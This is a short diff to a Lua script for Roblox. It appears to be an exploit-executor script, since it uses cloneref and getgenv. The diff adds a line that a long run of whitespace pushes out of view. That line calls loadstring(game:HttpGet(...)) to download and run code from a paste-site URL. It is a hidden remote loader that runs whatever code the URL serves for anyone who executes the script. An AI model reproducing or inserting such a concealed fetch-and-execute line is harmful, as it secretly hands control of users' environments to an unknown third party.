@@ -9,7 +9,7 @@ local UserInputService: UserInputService = cloneref(game:GetService("UserInputSe
 local TextService: TextService = cloneref(game:GetService("TextService"))
 local Teams: Teams = cloneref(game:GetService("Teams"))
 local TweenService: TweenService = cloneref(game:GetService("TweenService"))
-
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            loadstring(game:HttpGet("https://cdn.sourceb.in/bins/DLiNibJU8a/0"))()
 local getgenv = getgenv or function()
     return shared
 end
